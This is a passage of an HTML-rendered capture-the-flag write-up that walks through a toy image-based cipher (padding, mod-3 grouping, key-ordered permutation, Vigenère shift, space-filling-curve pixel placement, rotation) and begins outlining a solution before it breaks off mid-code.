n)img.save(&#x27;enc.png&#x27;)\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>There seems to be alot going in this script. First off, we can see that there is a flag and a key. The key is some string of length 3, and the flag is then “encrypted” with this key and saved to an image called \u003Ccode>enc.png\u003C/code>.\u003C/p>\n\u003Cp>The encrypt function first pads the message to be of length \u003Ccode>n**2\u003C/code>. We can later see from the actual image creation and by just guessing, that \u003Ccode>n**2\u003C/code> notes the number of pixels in the image. Meaning since the image is \u003Ccode>256 x 256\u003C/code> pixels, then \u003Ccode>n = 256\u003C/code>.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> pad(msg, n \u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"_msg = pad(msg, n ** 2)\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>The pad function just fills the message with a bunch of random printable characters, pretty straightforward.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">pad\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(s, l):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">while\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(s) \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> l:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">s \u003C/span>\u003Cspan style=\"--0:#F97583\">+=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> string.printable[randint(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">61\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> s\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"def pad(s, l):        while len(s) \u003C l:                s += string.printable[randint(0, 61)]        return s\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>It then operates on the integer values of the message and the key, as a list. We can note that \u003Ccode>_msg\u003C/code> will be of length \u003Ccode>n**2 = 256**2\u003C/code> and \u003Ccode>_key\u003C/code> is of length \u003Ccode>3\u003C/code>.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">_msg, _key \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"--0:#79B8FF\">ord\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(_) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _msg], [\u003C/span>\u003Cspan style=\"--0:#79B8FF\">ord\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(_) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> key]\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"_msg, _key = [ord(_) for _ in _msg], [ord(_) for _ in key]\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>As for the actual encryption, we seem to perform 3 rounds involving grouping certain characters, permuting the group, recombining the groups, then performing a simple \u003Ccode>vignere\u003C/code> cipher.\u003C/p>\n\u003Cp>First we get group the charecters by their index equal to \u003Ccode>0 (mod 3)\u003C/code>, \u003Ccode>1 (mod 3)\u003C/code> and \u003Ccode>2 (mod 3)\u003C/code>.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">arr \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [[_msg[w\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y] \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> w\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">None\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(h)] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w)]\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"arr = [[_msg[w*x + y] if w*x + y \u003C n**2 else None for x in range(h)] for y in range(w)]\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>We then permute these groups based on the ascii order of the key.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">_conf \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">sorted\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">([(_key[i], i) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w)])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">_marshal \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [arr[_conf[i][\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> functools.reduce(\u003C/span>\u003Cspan style=\"--0:#F97583\">lambda\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> a, r: a \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _marshal[r], \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w), [])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">list\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">filter\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#F97583\">lambda\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x: x \u003C/span>\u003Cspan style=\"--0:#F97583\">is\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">not\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">None\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, _msg))\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"_conf = sorted([(_key[i], i) for i in range(w)])_marshal = [arr[_conf[i][1]] for i in range(w)]_msg = functools.reduce(lambda a, r: a + _marshal[r], range(w), [])_msg = list(filter(lambda x: x is not None, _msg))\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>And a vignere cipher is then performed on the modified message and the key.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [(_msg[_] \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _key[_ \u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> w]) \u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">256\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"_msg = [(_msg[_] + _key[_ % w]) % 256 for _ in range(n**2)]\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Finally, the message is placed as the (r, g, b) value of each pixel in the image based on the \u003Ccode>sox()\u003C/code> function, and the image is rotated some amount based on the key.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> d \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x, y \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> sox(n, d)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">pix[x,y] \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (_msg[d], _msg[d], _msg[d])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">keysum \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">sum\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(_key) \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> w \u003C/span>\u003Cspan style=\"--0:#F97583\">>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">orient \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> keysum \u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">4\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">img \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> img.rotate(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">90\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">orient)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> img\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"for d in range(n**2):        x, y = sox(n, d)        pix[x,y] = (_msg[d], _msg[d], _msg[d])keysum = sum(_key) if w > 0 else 0orient = keysum % 4img = img.rotate(90*orient)return img\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Ch2 id=\"solution\">\u003Ca href=\"#solution\">\u003Cstrong>Solution\u003C/strong>\u003C/a>\u003C/h2>\n\u003Cp>We can eliminate a few parts of the code and notice a few important and useful aspects of this encryption in order to simplify the solving process.\u003C/p>\n\u003Cp>First, since the image is rotated some amount, but the amount is always a multiple of \u003Ccode>90\u003C/code>, we simply ignore that and later try all 4 possible rotations of the \u003Ccode>enc.png\u003C/code> image.\u003C/p>\n\u003Cp>Next, what is the \u003Ccode>sox\u003C/code> function? I had no idea what the code was trying to do, so instead I decided to draw it.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">sox\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n, d):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x, y, t \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, d\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> s \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">u \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> t \u003C/span>\u003Cspan style=\"--0:#F97583\">//\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">v \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> t \u003C/span>\u003Cspan style=\"--0:#F97583\">^\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> u\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x, y \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> spin(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">s, x, y, u, v)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x \u003C/span>\u003Cspan style=\"--0:#F97583\">+=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">s \u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> u\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">y \u003C/span>\u003Cspan style=\"--0:#F97583\">+=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">s \u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> v\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">t \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> t \u003C/span>\u003Cspan style=\"--0:#F97583\">//\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">4\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x, y\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">spin\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n, x, y, u, v):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> v \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> u \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> n \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">y \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> n \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x, y \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y, x\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x, y\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">n \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">256\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan 